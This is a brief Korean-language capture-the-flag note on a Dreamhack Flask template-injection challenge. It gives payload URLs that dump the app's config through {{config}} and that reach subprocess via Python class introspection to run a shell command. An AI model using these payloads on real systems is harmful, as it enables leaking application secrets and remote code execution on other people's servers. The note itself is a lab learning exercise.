#web-hacking 
# Payload
```text
http://host8.dreamhack.games:20415/%7B%7Bconfig%7D%7D
// http://host8.dreamhack.games:20415/{{config}}
```
- flask 템플릿 문법을 활용하면 된다.

# advanced
- 쉘 획득하기
```text
http://host8.dreamhack.games:20415/{{ ''.__class__.__mro__[1].__subclasses__()[408]('id', shell=True, stdout=-1).communicate() }}
```
- 참고 사이트 : https://me2nuk.com/SSTI-Vulnerability/
- 템플릿 엔진은 파이썬과 긴밀하게 연결되어 있다.
